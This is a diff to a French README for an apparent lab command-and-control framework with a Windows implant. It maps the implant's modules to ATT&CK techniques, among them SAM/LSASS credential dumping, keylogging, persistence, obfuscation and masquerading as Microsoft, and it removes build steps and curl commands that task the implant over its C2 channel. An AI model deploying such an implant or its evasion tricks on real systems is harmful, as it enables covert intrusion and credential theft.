@@ -195,14 +195,18 @@ cargo build -p c2_server --release
 
 | Technique | ID | Composant concerné |
 |---|---|---|
-| Application Layer Protocol: Web Protocols | T1071.001 | Canal HTTPS beacon ↔ serveur |
-| Encrypted Channel: Asymmetric Cryptography | T1573.002 | RSA-4096 + AES-256-GCM sur toutes les comms |
-| Masquerading: Match Legitimate Name | T1036.005 | implant déployé dans `%APPDATA%\Microsoft\Windows\Display\` |
-| Scheduled Task/Job: Scheduled Task | T1053.005 | tâche `DisplayOptimizationTask` au logon |
-| Command and Scripting Interpreter | T1059 | execution/shell.rs via CreateProcess + pipes |
-| OS Credential Dumping | T1003 | execution/creds.rs — SAM/LSASS |
-| Input Capture: Keylogging | T1056.001 | execution/keylog.rs — SetWindowsHookEx |
-| Data from Local System | T1005 | execution/loot.rs — collecte fichiers |
+| Application Layer Protocol: Web Protocols | T1071.001 | Canal HTTPS beacon ↔ serveur (`communication/https.rs`) |
+| Encrypted Channel: Symmetric Cryptography | T1573.001 | AES-256-GCM sur tous les payloads C2 (`shared/src/crypto.rs`) |
+| Encrypted Channel: Asymmetric Cryptography | T1573.002 | RSA-4096 pour l'échange de clé de session (`shared/src/crypto.rs`) |
+| Masquerading: Match Legitimate Name or Location | T1036.005 | implant dans `%APPDATA%\Microsoft\Windows\Display\`, cert `CN=update.microsoft.com` |
+| Obfuscated Files or Information | T1027 | strings sensibles chiffrées à la compilation via `obfstr!` (`evasion/obfuscation.rs`) |
+| Boot or Logon Autostart: Registry Run Keys | T1547.001 | valeur `DisplayOptimization` dans `HKCU\...\Run` (`persistence/registry.rs`) |
+| Scheduled Task/Job: Scheduled Task | T1053.005 | tâche `DisplayOptimizationTask` au logon (`persistence/scheduled_task.rs`) |
+| Hide Artifacts: Hidden Window | T1564.003 | `#![windows_subsystem = "windows"]` + `CREATE_NO_WINDOW` — aucune fenêtre visible |
+| Command and Scripting Interpreter | T1059 | `execution/shell.rs` via CreateProcess + pipes |
+| OS Credential Dumping | T1003 | `execution/creds.rs` — SAM/LSASS |
+| Input Capture: Keylogging | T1056.001 | `execution/keylog.rs` — SetWindowsHookEx |
+| Data from Local System | T1005 | `execution/loot.rs` — collecte fichiers sensibles |
 
 ---
 
@@ -244,16 +248,3 @@ python scripts/gen_cert.py
 cargo run -p c2_server
 
 # 3. Compiler et déployer l'implant sur la VM
-cargo build -p implant --target x86_64-pc-windows-msvc --release
-# Copier target/x86_64-pc-windows-msvc/release/implant.exe
-# → C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Display\implant.exe
-# (le module persistence le copie automatiquement au premier lancement)
-
-# 4. Vérifier le check-in depuis le host
-curl -k https://192.168.56.112/agents
-
-# 5. Envoyer une commande
-curl -k -X POST https://192.168.56.112/task \
-  -H "Content-Type: application/json" \
-  -d '{"id": "<agent_id>", "task": {"id": "t1", "cmd": "shell", "args": ["whoami"]}}'
-```
